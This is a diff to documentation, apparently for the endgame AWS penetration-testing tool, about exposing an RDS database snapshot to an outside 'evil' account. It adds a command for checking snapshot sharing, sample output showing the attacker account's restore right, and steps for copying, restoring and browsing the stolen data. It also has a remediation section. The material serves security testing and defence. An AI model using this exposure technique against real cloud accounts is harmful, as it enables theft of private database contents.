@@ -10,9 +10,41 @@ export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
 endgame expose --service rds --name test-resource-exposure
 ```
 
+
+* To view a list of the AWS Accounts that have access to the RDS DB Snapshot, run the following command from the victim account:
+
+```bash
+aws rds describe-db-snapshot-attributes \
+    --db-snapshot-identifier test-resource-exposure
+```
+
+
 ## Example
 
+* Observe that the account ID of the evil principal (`999988887777`) is listed alongside the AttributeName called `restore`. This means that the evil account ID is able to restore the snapshot of the RDS database in their own account.
+
+```json
+{
+    "DBSnapshotAttributesResult": {
+        "DBSnapshotIdentifier": "test-resource-exposure",
+        "DBSnapshotAttributes": [
+            {
+                "AttributeName": "restore",
+                "AttributeValues": [
+                    "999988887777"
+                ]
+            }
+        ]
+    }
+}
+```
+
 ## Exploitation
+
+After the RDS snapshot is public or shared with the rogue user account, an attacker can then:
+* [copy the snapshot](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_CopySnapshot.html#USER_CopyDBSnapshot)
+* [Restore a DB Instance from the DB Snapshot](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_Tutorials.RestoringFromSnapshot.html)
+* Browse the contents of the database, potentially revealing sensitive or otherwise non-public information.
 
 ## Remediation
 
@@ -34,3 +66,4 @@ Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaini
 
 - [aws rds modify-db-cluster-snapshot-attribute](https://docs.aws.amazon.com/cli/latest/reference/rds/modify-db-cluster-snapshot-attribute.html)
 - [aws rds modify-db-snapshot-attribute](https://docs.aws.amazon.com/cli/latest/reference/rds/modify-db-snapshot-attribute.html)
+- [aws rds describe-db-snapshot-attributes](https://docs.aws.amazon.com/cli/latest/reference/rds/describe-db-snapshot-attributes.html)
